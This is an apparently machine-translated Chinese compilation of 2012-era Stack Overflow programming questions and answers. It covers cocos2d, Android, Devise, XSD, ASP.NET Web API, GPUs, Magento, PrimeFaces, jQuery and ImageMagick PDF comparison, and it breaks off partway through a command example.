问题`self.parent.parent.(…).parent`在于，如果您需要更改父子关系，例如通过在层次结构中添加或删除父节点，这将完全中断。然后这将与 EXC_BAD_ACCESS 严重崩溃并且很难调试，因为您必须检查每个父级和父级的父级以查看它到底是什么类型的对象。访问超过 3 个或更多层次结构的父级我不会认为是不好的做法。**这是一种可怕的做法**。

就个人而言，为了访问共享精灵批次等常用节点，我更喜欢“MainScene”在其处于活动状态时成为临时单例类的解决方案。然后您可以从任何子节点执行以下操作：

```
CCSpriteBatchNode* mainBatch = [MainScene sharedMainScene].spriteBatchNode; 
```

要创建这个临时单例：

```
static MainScene* instance;
-(id) init
{
    self = [super init];
    if (self)
    {
        instance = self;
    }
    return self;
}
-(void) dealloc
{
    instance = nil;
}
-(MainScene*) sharedMainScene
{
    NSAssert(instance, @"MainScene is not initialized!");
    return instance;
} 
```

与真正的单例的不同之处在于，如果它还不存在，它不会初始化实例。因此 sharedMainScene 中的 NSAssert。您应该只在它已经运行时访问场景实例，即它只能由该特定场景的子节点使用。

这个半单例允许访问场景的所有属性。您还可以发送场景可以中继到其他节点的消息。或者将场景中需要移除但在碰撞处理本身期间无法移除的物理对象排入队列。

如果那个单身人士打扰了你，总有可能从导演那里得到正在运行的场景：

```
MainScene* mainScene = (MainScene*)[CCDirector sharedDirector].runningScene; 
```

仅当 runningScene 确实是 MainScene 对象时，您才应该小心转换为 MainScene。isKindOfClass：检查或断言是有序的。

# ruby-on-rails - Rails：我如何自定义设计，以便在登录后生成用户信息

> ID：12460550
> 
> 赞同：2
> 
> 时间：2012-09-17T13:42:55.087
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise

我设计了身份验证系统。当我使用

> curl -H 'Content-Type: application/json' -H 'Accept: application/json' -X POST `http://localhost:3000/users/sign_in` -d "{'user' : { 'email' : 'sample@example.com', 'password' : ' xxxxxxx'}}"

这给了我

> {"user":{"authentication_token":"yyyyyyyyyyyy","email":"sample@example.com"}}

但我需要的是如果登录有效，我还需要一些其他数据。例如，它可以是国家、名称、语言等以及当前数据。我怎样才能做到这一点？

# java - 从函数中启用 Android 应用程序按钮

> ID：12460557
> 
> 赞同：0
> 
> 时间：2012-09-17T13:43:22.663
> 
> 标签：java, android, button

我正在制作一个 android 应用程序，在启动期间我禁用了媒体播放器的暂停按钮。单击确定按钮后（音乐开始播放），我想启用暂停按钮。

这段代码工作正常，除了最后一行（我确实删除了一些不相关的行）。这给了我一个运行时错误（NullPointerException）。

我使用 MainActivity.this 来访问按钮。我究竟做错了什么？

感谢您的任何帮助！

```
public class MainActivity extends Activity {

    // initialise variables
    TextView textOut;
    MediaPlayer mediaPlayer;
    Button buttonPauze;
    Button ok;

    // *******************************************************
    // set Layout - on create
    // *******************************************************
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        textOut = (TextView) findViewById(R.id.textView1);

        // *******************************************************
        // set the play, generate and pauze buttons
        // *******************************************************
        Button buttonPauze = (Button) findViewById(R.id.buttonPauze);
        Button ok = (Button) findViewById(R.id.buttonStart);

        buttonPauze.setOnClickListener(buttonPauseOnClickListener);
    buttonPauze.setEnabled(false);
    ok.setEnabled(true);

    // *******************************************************
    // on click generate
    // *******************************************************
    ok.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {

            MainActivity.this.buttonPauze.setEnabled(true); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:45:45.883

代替：

```
Button buttonPauze = (Button) findViewById(R.id.buttonPauze); 
```

和：

```
buttonPauze = (Button) findViewById(R.id.buttonPauze); 
```

* * *

基本上，您有 2 个`buttonPauze`，一个作为局部变量，另一个作为类字段。通过删除`Button`，您在`buttonPauze`本地使用类字段并为其分配适当的对象。

* * *

同样的事情`ok`！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:48:04.950

NPE 是因为您将按钮引用分配给局部变量，`onCreate()`然后尝试访问未初始化的全局变量。替换这个：

```
Button buttonPauze = (Button) findViewById(R.id.buttonPauze); 
```

有了这个

```
buttonPauze = (Button) findViewById(R.id.buttonPauze); 
```

为避免此类错误，您可以采用常见做法并为类全局变量添加前缀，例如

```
Button mButton; 
```

不要使用`MainActivity.this.`语法。这是没有意义的，因为您正在访问同一类的变量。只是

```
buttonPauze.setEnabled(true); 
```

就足够了（顺便说一句：它是“暂停”）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:46:05.647

在行

```
Button buttonPauze = (Button) findViewById(R.id.buttonPauze); 
```

您正在定义并分配给局部变量，而不是实例变量。因此，当您在行中引用实例变量时

```
MainActivity.this.buttonPauze.setEnabled(true); 
```

`buttonPauze`还没有设置，它仍然是`null`。要修复，只需更改为

```
buttonPauze = (Button) findViewById(R.id.buttonPauze); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:48:29.327

因为您正在创建与全局变量同名的局部变量，所以它给出了问题。

//不创建局部变量

```
 buttonPauze = (Button) findViewById(R.id.buttonPauze);
  ok = (Button) findViewById(R.id.buttonStart); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-14T17:32:43.250

不要定义 buttonPause 两次..

# xml - 在 XSD Schema 中定义 XML 元素的别名

> ID：12460560
> 
> 赞同：7
> 
> 时间：2012-09-17T13:43:27.850
> 
> 标签：xml, xsd, alias

是否有用于为 XML 元素定义别名的 XSD 语言支持或技巧（例如通过预处理器）？我想为我的模式中的所有元素设置别名，以便为我们的 XML 文档的更神秘但网络带宽效率更高的版本创建一个选项。

例如，我想定义一个名称，例如作为`IRQ`元素的别名`InterruptRequest`等。

```
<xs:element name="InterruptRequest" minOccurs="0">
    <xs:complexType>
        <xs:attribute name="level" type="xs:unsignedShort" use="required"/>
    </xs:complexType>
</xs:element> 
```

这样下面的两个声明就等价了

```
<!-- Human readable but bandwidth inefficient -->
<InterruptRequest level="22" /> 

<!-- Cryptic, but comparatively bandwidth efficient -->
<IRQ level="22" /> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T14:26:28.023

您不能将两个元素名称定义为同义词，但可以通过替换组将一个元素名称定义为可替换另一个元素名称。它们在您的应用程序中看起来仍然不同，但验证过程将允许其中一个在内容模型允许另一个的任何地方使用。

```
<element name="a">...

<element name="b" substitutionGroup="a">... 
```

# asp.net-web-api - 从局域网中的其他计算机使用 ASP.NET Web Api 服务

> ID：12460562
> 
> 赞同：5
> 
> 时间：2012-09-17T13:43:30.700
> 
> 标签：asp.net-web-api

我对此进行了谷歌搜索，但找不到任何可以解决我的问题的东西。（我是 ASP.NET Web Api 的新手）

我构建了一个 ASP.NET Web Api，当我从本地机器上的 Visual Studio 运行它时，一切都运行良好。（在这两种情况下，当我使用“使用 Visual Studio 开发服务器”和“使用本地 IIS Web 服务器”时，它都可以正常工作）。

问题是当我尝试从局域网中的其他计算机调用此 Web 服务时它不起作用（类似于：“http://192.168.2.103:8080/api/blabla”）。(1) 使用“使用 Visual Studio 开发服务器” - 客户端超时完成。(2) 使用“使用本地 IIS Web 服务器” - 客户端收到 HTTP ERROR 400 “Bad Request - Invalid Hostname”（当我使用端口 8080 并向 Windows 防火墙添加规则以通过此端口时）。

我还尝试完全禁用Windows防火墙，防病毒，但没有帮助。

我在 WCF 中实现了其他 http web 服务项目，一切正常，我可以从局域网中的其他计算机进行通信。

笔记！(1) 另一台计算机不是 windows....如果它很重要) (2) 到计算机/地址之间的 ping 工作正常。

我将非常感谢任何帮助。谢谢，

海姆

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T03:23:01.220

(1)visual studio开发服务器不支持远程连接。[有关](https://stackoverflow.com/questions/220274/remote-machines-cannot-connect-to-visual-studio-web-server)更多详细信息，请参阅。人们尝试在这些情况下设置反向代理等变通方法。

(2) 通过“本地 IIS 网络服务器”，我假设您使用的是 IIS Express。不幸的是，IIS Express 默认不允许远程连接。要允许远程连接，请参阅此[问题](https://stackoverflow.com/questions/5433786/configure-iis-express-for-external-access-to-vs2010-project)。

# gpu - GPU 性能相对于 CPU

> ID：12460565
> 
> 赞同：1
> 
> 时间：2012-09-17T13:43:51.507
> 
> 标签：gpu

为什么 GPU 在数值计算中的性能比 CPU 更高？更糟糕的是分支？有人可以给我一个详细的解释吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:49:58.517

不确定您到底在寻找什么。假设这是为了一般理解为什么这样做而不是另一种方式。本文对您的问题提供了合理的理解（用外行的话）：

[https://en.bitcoin.it/wiki/Why_a_GPU_mines_faster_than_a_CPU](https://en.bitcoin.it/wiki/Why_a_GPU_mines_faster_than_a_CPU)

简而言之：

> 一个 CPU 内核每个时钟可以执行 4 条 32 位指令（使用 128 位 SSE 指令）或通过 AVX（256 位）执行 8 条，而像 Radeon HD 5970 这样的 GPU 每个时钟可以执行 3200 条 32 位指令（使用它的 3200 个 ALU 或着色器）。这是每个时钟 800 倍（或 AVX 的情况下为 400 倍）指令的差异。截至 2011 年，最快的 CPU 拥有多达 6、8 或 12 个内核和更高频率的时钟（2000-3000 MHz 对比 Radeon HD 5970 的 725 MHz），但一个 HD5970 仍然比 Radeon HD 5970 快五倍以上四个 2.3GHz 的 12 核 CPU（这也将使您花费大约 4700 美元，而不是 HD5970 的 350 美元）。

GPU 是为特定任务而设计的，即渲染需要大量计算的 3D 图形。因此，某些应用程序将“数字运算”卸载到 GPU，就像大多数现代浏览器一样。而对于分支功能，由于 CPU 具有更好的“霸主”功能，因此任务由 CPU 保留（现在，谁知道他们以后会做什么）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T16:46:17.940

GPU 中的每个 SM 都是一个 SIMD 处理器，在 SIMD 的每个通道上执行不同的 warp 线程。一旦应用程序受到更多计算限制（一些内存访问）并且没有分支应用程序达到 GPU 的峰值 FLOPS。这是因为在分支时，GPU 会掩盖分歧的一侧并首先执行另一侧。两条路径都连续执行，使一些 SIMD 通道处于非活动状态，从而降低了性能。

我在[Fung 的论文](http://reference.kfupm.edu.sa/content/d/y/dynamic_warp_formation_and_scheduling_fo_85104.pdf)中包含了一个有用的图，该图可在上述参考资料中公开获得，以显示性能实际上是如何下降的：![在此处输入图像描述](../Images/42d270d713490eaf8696722b8a471153.png)

图 (a) 显示了一个典型的 GPU 分支分歧发生在一个 warp 内部（这个样本中有 4 个线程）。假设您有以下内核代码：

```
A:  // some computation
    if(X){
B:      // some computation
        if(Y){
C:          // some computation
        }
        else{
D:          // some computation
        }
E:      // some computation
    }else{
F:      // some computation
    }
G:  // some computation 
```

A 处的线程分为 B 和 F。如 (b) 所示，随着时间的推移，一些 SIMD 通道被禁用，性能下降。图 (c) 到 (e) 显示了硬件如何串行执行发散路径并管理发散。有关更多信息，请参阅这篇有用的论文，这是一个很好的起点。

矩阵乘法或 N-Body 模拟等计算受限应用程序可以很好地映射到 GPU 并返回非常高的性能。这是因为它们很好地占据了 SIMD 通道，遵循流模型，并且有一些内存访问。

# java - 使用 ObjectInputStream 从资产中读取二进制文件

> ID：12460566
> 
> 赞同：1
> 
> 时间：2012-09-17T13:44:02.417
> 
> 标签：java, android, binaryfiles, objectinputstream

我最近决定将我的 3d 模型格式转换为二进制文件而不是 ASCII，以期提高速度......我阅读了一些 java 教程，阅读我的格式的最简单方法似乎是使用 ObjectInputStream 和readLong() 和 readFloat() 命令的混合......但我似乎无法让代码工作......

这是我的测试代码：

```
void testLoadBin(String fileName, Context context){
try {
    InputStream fis = context.getAssets().open(fileName);
    ObjectInputStream is = new ObjectInputStream(fis);
    long test;
    test = is.readLong();
    Log.i("World", "output" + test);
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
    Log.i("World", "ERROR");
    }
} 
```

在这个例子中，我只是试图从文件中读取第一个 LONG，但总是抛出 IOException，我不知道该怎么做才能解决这个问题。

任何帮助都会很有用。

* * *

快速添加：堆栈跟踪错误输出：

```
09-18 00:16:08.559: INFO/World(3861): java.io.StreamCorruptedException
09-18 00:16:08.559: INFO/World(3861):     at java.io.ObjectInputStream.readStreamHeader(ObjectInputStream.java:2369)
09-18 00:16:08.559: INFO/World(3861):     at java.io.ObjectInputStream.<init>(ObjectInputStream.java:433)
09-18 00:16:08.559: INFO/World(3861):     at org.ogl.ndkvbo.Screen.testLoadBin(Screen.java:6605)
09-18 00:16:08.559: INFO/World(3861):     at org.ogl.ndkvbo.camState_intload.update(camState_intload.java:24)
09-18 00:16:08.559: INFO/World(3861):     at org.ogl.ndkvbo.StateMachine.update(StateMachine.java:65)
09-18 00:16:08.559: INFO/World(3861):     at org.ogl.ndkvbo.camera.update(camera.java:46)
09-18 00:16:08.559: INFO/World(3861):     at org.ogl.ndkvbo.GameThread.run(GameThread.java:50) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:59:05.327

如果要使用 ObjectInputStream()，则必须使用 ObjectOutputStream()。然而，没有什么能阻止你，因为 ObjectInputStream 和 ObjectOutputStream 从 DataOutputStream 和 DataInputStream 扩展而来。

因此，如果您还可以将代码片段发布到您正在写入文件的位置，那将会很有帮助。还要检查该行中的 fis`InputStream fis = context.getAssets().open(fileName);`是否正确并且实际上指向您打算从中读取的文件。

# magento - 在magento下订单时以编程方式停止减少库存数量

> ID：12460568
> 
> 赞同：5
> 
> 时间：2012-09-17T13:44:08.697
> 
> 标签：magento

我需要在下订单时停止减少库存，我需要在成功付款后进行此活动。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-20T06:41:11.483

是的，我们可以务实地禁用此数量减少

**如何 ？**

扩展**Mage_Checkout_Model_Type_Onepage**并**重写**方法**saveOrder**

**变化**

在上述方法中的以下行之前，将在 #740 到 #742 左右

```
 $service = Mage::getModel('sales/service_quote', $this->getQuote());
    $service->submitAll(); 
```

添加

```
 $quote = $this->getQuote();
    # Ref: Mage_CatalogInventory_Model_Observer::subtractQuoteInventory
    $quote->setInventoryProcessed(true); 
```

这将通知 Magento 不为报价处理库存，因此即使配置为这样做也不会减少数量。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-17T14:11:03.367

系统 > 配置 > 目录 > 库存 > 库存选项

下单时减少库存 > 否

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-24T15:32:30.360

对于任何想了解有关下订单减法的更多信息的人，只需在 Magento EE/CE 中研究此事件

```
sales_model_service_quote_submit_before 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:21:08.520

您可以在管理员中禁用库存管理，除非有特殊原因需要这样做？

您可以设置一个观察者在成功付款后添加到 Qty：您可以在此处查看您可以挂钩的 Magento 事件列表：http: [//www.nicksays.co.uk/magento_events_cheat_sheet/](http://www.nicksays.co.uk/magento_events_cheat_sheet/)

```
 <events>
   <sales_order_payment_pay>
      <observers>
        <my_observer>
            <type>singleton</type>
            <class>my/observer</class>
            <method>addQty</method>
        </my_observer>
      </observers>
   </sales_order_payment_pay>     
</events> 
```

然后你的观察者会重新添加数量..

```
<?php
class Company_My_Model_Observer
{
    public function addQty($event)
    {
        $order = $event->getInvoice()->getOrder(); // Mage_Sales_Model_Order
        $items = $order->getAllVisibleItems();

        foreach($items  as $item) {
             $qty = $item->getQtyOrdered(); // Amount to add back on
             $product = Mage::getModel('catalog/product')->load($item->getProductId());
             /**
              * Here you would load the product and add this amount back on
              */
        }

        return $this;
    }
} 
```

这可能不会按原样工作，但你明白了。您需要注意 magento 和支付类型事件，因为不同的支付模块处理这些事件的方式略有不同。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-06-22T12:32:38.980

在某些情况下，您可以使用以下内容：

**配置文件**

```
<frontend>
    <routers>
        <sales_model_service_quote_submit_after>
            <observers>
                <inventory>
                    <type>singleton</type>
                    <class>Vendor_Name_Model_Observer</class>
                    <method>revertQuoteInventory</method>
                </inventory>
            </observers>
        </sales_model_service_quote_submit_after>
    </events>
</frontend> 
```

**观察者.php**

```
public function revertQuoteInventory(Varien_Event_Observer $observer)
{
    $quote = $observer->getEvent()->getQuote();
    $inventory = Mage::getModel('cataloginventory/observer');
    $inventory->revertQuoteInventory($observer);
    $inventory->reindexQuoteInventory($observer);

    $quote->setInventoryProcessed(true);
} 
```

# java - 输入流。读取返回 0 或 -1？

> ID：12460571
> 
> 赞同：8
> 
> 时间：2012-09-17T13:44:32.990
> 
> 标签：java

有什么区别

```
byte[] buffer = new byte[1024];
// this:
if (inputStream.read(buffer) > 0) { /*...*/ }
// and:
if (inputStream.read(buffer) != -1) { /*...*/ } 
```

两者都可以确定网络流终止吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-17T13:54:00.060

Javadocs[`InputStream.read()`](http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#read%28byte%5B%5D%29)说：

> 如果 的长度`b`为零，则不读取任何字节并返回 0

在正常使用中，这永远不会发生，因此明确测试这种情况没有多大意义。（如果你想避免永远循环，因为缓冲区是零长度并且在这种情况下快速失败，只需测试缓冲区的长度。）

更进一步，还有：

> **返回：**读入缓冲区的总字节数，或者`-1`是否因为到达流的末尾而没有更多数据。

如果要测试*文件结尾*（或网络流，或其他），请使用测试：

```
if ( inputStream.read(buffer) != -1 ) ... 
```

没有错误的 Java 实现将永远不会返回任何其他内容以表明没有更多可用数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-02-28T21:37:03.773

如果您已经知道缓冲区长度不为零，*那么这两个表达式之间没有有效区别*。鉴于这个关于有效缓冲区的基本规定，它可以从**永远不会返回的**[文档](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/InputStream.html#read(byte%5B%5D))中推断出来。**`read``0`**

> 在输入数据可用、检测到文件结尾或引发异常之前，此方法会一直阻塞。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:50:22.073

根据[文档](http://docs.oracle.com/javase/6/docs/api/java/io/InputStream.html#read%28%29)，`inputstream.read(buffer) !=-1`会告诉您流已结束。`inputstream.read(buffer) == 0`只是说没有可读取的字节，但流仍然处于活动状态（即，自从您上次读取所有可能的内容以来，对等方还没有发送任何内容）。

# validation - 在验证失败时自动在 p:dialog 中显示验证消息

> ID：12460572
> 
> 赞同：7
> 
> 时间：2012-09-17T13:44:33.410
> 
> 标签：validation, jsf, dialog, primefaces

我想在组件中显示验证消息和来自支持 bean 的消息`<p:dialog>`。在我的 JSF 页面中，我定义了以下对话框：

```
<p:dialog widgetVar="messageDialog" id="msgDialog" modal="true" appendToBody="true">
    <h:form id="messageForm">
        <p:messages id="messagesInDialog" />
        <p:commandButton value="OK" onclick="messageDialog.hide()" />
    </h:form>
</p:dialog> 
```

在支持 bean 中附加一些消息后，我执行以下代码：

```
RequestContext.getCurrentInstance().execute("messageDialog.show()"); 
```

它工作正常。

但是，我还想在此对话框中显示 bean 验证消息。验证后将消息附加到`<p:message>`组件，但我不知道如何在验证失败后显示此对话框。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-17T13:53:17.203

您可以使用 的`visible`属性`<p:dialog>`来指定对话框是否应默认显示。您可以检查[`FacesContext#isValidationFailed()`](http://docs.oracle.com/javaee/6/api/javax/faces/context/FacesContext.html#isValidationFailed%28%29)是否存在验证失败。

所以，简而言之：

```
<p:dialog id="msgDialog" widgetVar="messageDialog" modal="true" appendToBody="true"
    visible="#{facesContext.validationFailed}">
    <p:messages id="messagesInDialog" />
    <p:button value="OK" onclick="messageDialog.hide()" />
</p:dialog> 
```

*（请注意，我通过 a简化了不必要的`h:form`和）`p:commandButton``p:button`*

然后将通过以下方式更新：

```
<p:commandButton value="submit" update=":msgDialog" /> 
```

或者只是将它放在 a`<p:outputPanel autoUpdate="true">`中，以便它在每个 ajax 请求上自动更新，而无需在每个`update`属性中指定它：

```
<p:outputPanel autoUpdate="true">
    <p:dialog id="msgDialog" widgetVar="messageDialog" modal="true" appendToBody="true"
        visible="#{facesContext.validationFailed}">
        <p:messages id="messagesInDialog" />
        <p:button value="OK" onclick="messageDialog.hide()" />
    </p:dialog>
</p:outputPanel> 
```

### 也可以看看：

*   [<p:dialog> 的渲染属性和可见属性之间的区别](https://stackoverflow.com/questions/10050669/difference-between-rendered-and-visible-attributes-of-pdialog/10050924#10050924)

* * *

**与具体问题无关**，涵盖非验证消息，例如您在操作方法中添加的那些全局消息，而不是检查是否[`FacesContext#getMessageList()`](http://docs.oracle.com/javaee/6/api/javax/faces/context/FacesContext.html#getMessageList%28%29)不为空。

```
<p:dialog ... visible="#{not empty facesContext.messageList}"> 
```

*当有任何*消息时，这将显示对话框。这样`RequestContext#execute()`调用就没有必要了。

# jquery - jQuery Sortable - iFrame SRC 不在 DOM 中

> ID：12460573
> 
> 赞同：1
> 
> 时间：2012-09-17T13:44:33.477
> 
> 标签：jquery, jquery-ui, jquery-ui-sortable

我有类似的小部件/portlet

```
<div id="100" class="portlets">
     <iframe src="widgets/widget1_iframe.html"></iframe>
</div> 
```

每个 iFrame 中都有另一个 iFrame。我可以添加多个小部件/portlet 并对其进行排序。

我有一个脚本，它（对于每次更改）获取初始 iFrame 的 SRC（因此在本例中为**widgets/widget1_iframe.html**）和 iFrame 中 iFrame 的 SRC（在我的测试版本中，它会提醒用户）。

因此，使用之前的示例，假设我添加了一个新示例以具有类似于

```
<div id="200" class="portlets">
     <iframe src="widgets/widget2_iframe.html"></iframe>
</div> 
```

然后我决定将第二个移到第一个之上。我的脚本正确显示了**widgets/widget2_iframe.html**但随后 iframe 中的 iframe 没有显示任何内容。然后它会正确显示**widgets/widget1_iframe.html**以及该 iframe 中的 iFrame。

我进行了检查，并且小部件/portlet 中的 iFrame（在 iframe 内）对 DOM 不可用。

所以基本上，如果我添加并移动了 100 个 portlet，它将向我显示除已移动的小部件/portlet 的 iframe 中的 iframe 之外的所有正确信息。下面是我的**可排序**函数的**停止**事件

 **```
stop: function (event, ui) {
    var sortorder = '';
    $('.' + opts.columnClass).each(function () {
        var itemorder = $(this).sortable('toArray');
        sortorder += itemorder.toString();
    });

    var substr = sortorder.split(',');

    jQuery.each(substr, function () {
            $.post("process.php", {
                widget: $('div#' + this + ' div.widgetcontent iframe').attr("src"),
                iframe: $('div#' + this + ' div.widgetcontent iframe').contents().find('iframe').attr("src")

            }, function (data) {
                alert("Data Loaded: " + data);
            });

    }); 
```

本质上 - 没有为已移动的小部件/portlet 传递 iFrame 的值

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:54:04.597

我在 1 秒后立即延迟`stop: function(event, ui) {`，这似乎对其进行了排序**

# android - 带有自定义 xml 的 ClassCastException

> ID：12460576
> 
> 赞同：0
> 
> 时间：2012-09-17T13:44:37.987
> 
> 标签：android, xml, classcastexception

我正在尝试为 xml 制作自定义控件。但它给出了以下错误

```
 java.lang.ClassCastException:
     com.tdsoc.android.cardzlib.ui.EventElementView cannot be cast to
     android.view.ViewGroup     at
   android.view.LayoutInflater.rInflate(LayoutInflater.java:624)    at
     android.view.LayoutInflater.inflate(LayoutInflater.java:408)   at
     android.view.LayoutInflater.inflate(LayoutInflater.java:296)   at
    com.android.layoutlib.bridge.impl.RenderSessionImpl.inflate(RenderSessionImpl.java:279)
        at com.android.layoutlib.bridge.Bridge.createSession(Bridge.java:318)
        at
     com.android.ide.common.rendering.LayoutLibrary.createSession(LayoutLibrary.java:325)
        at
    com.android.ide.eclipse.adt.internal.editors.layout.gle2.RenderService.createRenderSession(RenderService.java:372)
        at
     com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.renderWithBridge(GraphicalEditorPart.java:1640)
        at
     com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.recomputeLayout(GraphicalEditorPart.java:1391)
        at
     com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.onXmlModelChanged(GraphicalEditorPart.java:1353)  at
     com.android.ide.eclipse.adt.internal.editors.layout.LayoutEditorDelegate.delegateXmlModelChanged(LayoutEditorDelegate.java:395)
        at
    com.android.ide.eclipse.adt.internal.editors.common.CommonXmlEditor.xmlModelChanged(CommonXmlEditor.java:328)
        at
     com.android.ide.eclipse.adt.internal.editors.AndroidXmlEditor$XmlModelStateListener.modelChanged(AndroidXmlEditor.java:1610)
        at
     com.android.ide.eclipse.adt.internal.editors.AndroidXmlEditor.wrapEditXmlModel(AndroidXmlEditor.java:1084)
        at
     com.android.ide.eclipse.adt.internal.editors.AndroidXmlEditor.wrapUndoEditXmlModel(AndroidXmlEditor.java:1160)
        at
    com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart$ActionLinkStyleRange.onClick(GraphicalEditorPart.java:2457)
        at
     com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart$ErrorLabelListener.mouseUp(GraphicalEditorPart.java:2522)
    at
     org.eclipse.swt.widgets.TypedListener.handleEvent(TypedListener.java:219)
        at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
        at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1053)   at
     org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:4165)
        at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3754)
        at
     org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:2696)
        at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:2660)     at
     org.eclipse.ui.internal.Workbench.access$4(Workbench.java:2494)    at
     org.eclipse.ui.internal.Workbench$7.run(Workbench.java:674)    at
     org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
        at
     org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:667)
        at
     org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
        at
     org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:123)
        at
     org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
        at
    org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
        at
    org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
        at
     org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:344)
        at
     org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)  at
     sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)    at
    sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)     at
     java.lang.reflect.Method.invoke(Unknown Source)    at
     org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:622)   at
    org.eclipse.equinox.launcher.Main.basicRun(Main.java:577)   at
    org.eclipse.equinox.launcher.Main.run(Main.java:1410) 
```

# pdf - PDF文件的视觉差异以确定像素完美性

> ID：12460577
> 
> 赞同：23
> 
> 时间：2012-09-17T13:44:41.760
> 
> 标签：pdf, comparison, compare

我需要使用 MS Reporting Services 重构一些报告（使用 Jasper 生成）。原始报告的副本以 PDF 格式提供。要求是让新报告“像素完美”，这很麻烦……

为了让生活更轻松，我想要一个工具来覆盖原始和生成的报告 PDF，以测量它们是否像素完美。

有这样的工具吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-09-17T20:48:11.960

最简单、立即可用的方法：使用[ImageMagick`compare`](https://imagemagick.org/script/compare.php)（在 Windows/Linux/Mac 和其他平台上也可用）。

它甚至可以比较 PDF 页面（尽管它使用 Ghostscript 作为其*代理*首先将 PDF 页面呈现为像素图像）：

```
 compare.exe         ^
    tested.pdf[0]    ^
    reference.pdf[0] ^
   -compose src      ^
    delta.pdf 
```

结果`delta.pdf`会将每个像素描绘为红色，在两个比较的 PDF 页面之间具有不同的颜色。所有相同的像素都是纯白色的。`[0]`告诉使用每个文件的`compare`第一页进行比较（页数从零开始）。

您可以通过以下示例了解这是如何工作的：

```
 compare.exe                      ^
    http://qtrac.eu/boson1.pdf[1] ^
    http://qtrac.eu/boson2.pdf[1] ^
   -compose src                   ^
    delta.pdf 
```

以下是相应的页面（转换为按比例缩小的 PNG 用于 Web 显示）。参考页面在左侧，修改后的页面在中间，“delta-pixel-are-red”图像在右侧：

![第一页](../Images/b0bec51c1e7168ce615feb09d904fe83.png) ![第二页](../Images/9e02d91ca737868c21d02977c16ef354.png) ![增量图像](../Images/a8a39f0ce777914b5eade4c4b5b9657f.png)

`-compose src`通过跳过参数可以获得稍微不同的视觉结果。然后，您将获得原始文件的像素作为灰色阴影背景（用于上下文），增量像素为红色：

```
 compare.exe                      ^
    http://qtrac.eu/boson1.pdf[1] ^
    http://qtrac.eu/boson2.pdf[1] ^
    delta.pdf 
```

![第一页](../Images/b0bec51c1e7168ce615feb09d904fe83.png) ![第二页](../Images/9e02d91ca737868c21d02977c16ef354.png) ![三角洲.pdf](../Images/dd4b7970e19706b49684a51732d9eee1.png)

如果您不喜欢像素差异的红色，请使用`-highlight-color`：

```
 compare.exe                      ^
    http://qtrac.eu/boson1.pdf[1] ^
    http://qtrac.eu/boson2.pdf[1] ^
   -highlight-color green         ^
    delta.pdf 
```

用于呈现 PDF 页面的默认分辨率为 72 dpi。如果您需要更高的精度，可以使用如下`-density`参数切换到 300 dpi：

```
 compare.exe                      ^
   -density 300                   ^
    http://qtrac.eu/boson1.pdf[1] ^
    http://qtrac.eu/boson2.pdf[1] ^
    delta.pdf 
```

**请注意，**切换到更高的密度会减慢进程并创建更大的文件。

您甚至可以为 delta 图像创建一个 *.txt 文件，该文件描述每个像素的坐标和相应的颜色值：

```
 compare                          ^
    http://qtrac.eu/boson1.pdf[1] ^
    http://qtrac.eu/boson2.pdf[1] ^
   -compose src                   ^
   -highlight-color black         ^
